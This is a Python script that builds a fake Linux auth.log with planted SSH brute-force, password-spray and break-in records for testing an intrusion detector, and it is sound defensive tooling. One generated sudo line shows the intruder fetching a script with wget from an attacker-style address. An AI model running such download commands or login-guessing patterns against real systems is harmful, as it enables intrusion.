"""
Generates a realistic fake Linux auth.log with known attacks hidden inside it,
so the detector can be tested without a real server.

All IP addresses come from the ranges reserved for documentation
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), so none of them belong
to real people.

What's hidden in the log:
    203.0.113.45   brute force      40 failed root/admin logins in ~3 minutes
    192.0.2.77     password spray   12 different usernames, one try each
    203.0.113.99   BREAK-IN         7 failures on "deploy", then a successful login
    198.51.100.200 slow and low     6 failures, but 15 minutes apart (should NOT alert)
    everyone else  normal users     daily logins, the odd typo, cron and sudo noise

Usage:
    python scripts/generate_sample_log.py                 # writes sample_logs/auth.log
    python scripts/generate_sample_log.py -o my.log --seed 7
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta
from pathlib import Path

HOST = "web01"
START = datetime(2026, 10, 24, 6, 0, 0)

NORMAL_USERS = {
    "kaseem": "198.51.100.7",
    "deploy": "198.51.100.8",
    "alice": "198.51.100.21",
    "bob": "198.51.100.34",
    "backup": "198.51.100.50",
}
SPRAY_USERNAMES = [
    "admin", "test", "oracle", "postgres", "ubuntu", "guest",
    "user", "ftp", "git", "jenkins", "pi", "support",
]


class LogWriter:
    def __init__(self, rng: random.Random):
        self.rng = rng
        self.lines: list[tuple[datetime, str]] = []

    def _pid(self) -> int:
        return self.rng.randint(1000, 39999)

    def _port(self) -> int:
        return self.rng.randint(32768, 60999)

    def _stamp(self, t: datetime) -> str:
        # syslog style: "Oct 24 14:02:11" (day padded with a space if single digit)
        return f"{t:%b} {t.day:>2} {t:%H:%M:%S}"

    def add(self, t: datetime, text: str) -> None:
        self.lines.append((t, f"{self._stamp(t)} {HOST} {text}"))

    def ssh_fail(self, t: datetime, user: str, ip: str, invalid: bool = False) -> None:
        pid, port = self._pid(), self._port()
        who = f"invalid user {user}" if invalid else user
        if invalid:  # real sshd logs this line first
            self.add(t, f"sshd[{pid}]: Invalid user {user} from {ip} port {port}")
        self.add(t, f"sshd[{pid}]: Failed password for {who} from {ip} port {port} ssh2")
        self.add(t + timedelta(seconds=1),
                 f"sshd[{pid}]: Connection closed by authenticating user {user} {ip} port {port} [preauth]")

    def ssh_ok(self, t: datetime, user: str, ip: str, method: str = "password") -> None:
        pid, port = self._pid(), self._port()
        self.add(t, f"sshd[{pid}]: Accepted {method} for {user} from {ip} port {port} ssh2")
        self.add(t, f"sshd[{pid}]: pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)")
        end = t + timedelta(minutes=self.rng.randint(2, 45))
        self.add(end, f"sshd[{pid}]: Received disconnect from {ip} port {port}:11: disconnected by user")
        self.add(end, f"sshd[{pid}]: pam_unix(sshd:session): session closed for user {user}")

    def render(self) -> str:
        self.lines.sort(key=lambda x: x[0])
        return "\n".join(line for _, line in self.lines) + "\n"


def normal_day(w: LogWriter) -> None:
    rng = w.rng
    for user, ip in NORMAL_USERS.items():
        for _ in range(rng.randint(3, 6)):
            t = START + timedelta(minutes=rng.randint(0, 14 * 60))
            if rng.random() < 0.25:  # a fat-fingered password, then success
                w.ssh_fail(t, user, ip)
                t += timedelta(seconds=rng.randint(5, 20))
            method = "publickey" if user in ("deploy", "backup") else "password"
            w.ssh_ok(t, user, ip, method)

    # background noise every few minutes
    t = START
    while t < START + timedelta(hours=14):
        w.add(t, f"CRON[{w._pid()}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
        w.add(t + timedelta(seconds=1), f"CRON[{w._pid()}]: pam_unix(cron:session): session closed for user root")
        if rng.random() < 0.15:
            w.add(t + timedelta(seconds=30),
                  "sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update")
        t += timedelta(minutes=rng.randint(5, 15))


def brute_force(w: LogWriter) -> None:
    ip, t = "203.0.113.45", START + timedelta(hours=3, minutes=12)
    for i in range(40):
        user = "root" if i % 4 else "admin"
        w.ssh_fail(t, user, ip, invalid=(user == "admin"))
        t += timedelta(seconds=w.rng.randint(2, 7))


def password_spray(w: LogWriter) -> None:
    ip, t = "192.0.2.77", START + timedelta(hours=6, minutes=40)
    for user in SPRAY_USERNAMES:
        w.ssh_fail(t, user, ip, invalid=True)
        t += timedelta(seconds=w.rng.randint(20, 40))


def break_in(w: LogWriter) -> None:
    ip, t = "203.0.113.99", START + timedelta(hours=9, minutes=5)
    for _ in range(7):
        w.ssh_fail(t, "deploy", ip)
        t += timedelta(seconds=w.rng.randint(15, 35))
    w.ssh_ok(t, "deploy", ip, "password")
    w.add(t + timedelta(minutes=1),
          f"sudo:   deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.99/x.sh")


def slow_and_low(w: LogWriter) -> None:
    ip, t = "198.51.100.200", START + timedelta(hours=1)
    for _ in range(6):
        w.ssh_fail(t, "alice", ip)
        t += timedelta(minutes=15)


def generate(seed: int = 42) -> str:
    w = LogWriter(random.Random(seed))
    normal_day(w)
    brute_force(w)
    password_spray(w)
    break_in(w)
    slow_and_low(w)
    return w.render()


def main() -> None:
    p = argparse.ArgumentParser(description="Generate a fake auth.log with hidden attacks.")
    p.add_argument("-o", "--output", default="sample_logs/auth.log")
    p.add_argument("--seed", type=int, default=42)
    args = p.parse_args()
    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(generate(args.seed), encoding="utf-8")
    print(f"wrote {out}")


if __name__ == "__main__":
    main()
